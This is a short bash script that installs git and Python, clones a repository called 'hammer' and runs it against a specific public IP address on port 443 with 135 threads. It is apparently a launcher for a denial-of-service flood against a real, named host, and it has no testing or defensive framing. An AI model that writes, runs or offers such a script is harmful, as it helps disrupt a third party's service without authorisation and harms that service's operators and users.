#!/bin/bash

apt install git
git clone https://github.com/cyweb/hammer.git

cd hammer

apt install python
apt install python3

python3 hammer.py -s 45.60.207.1 -p 443 -t 135

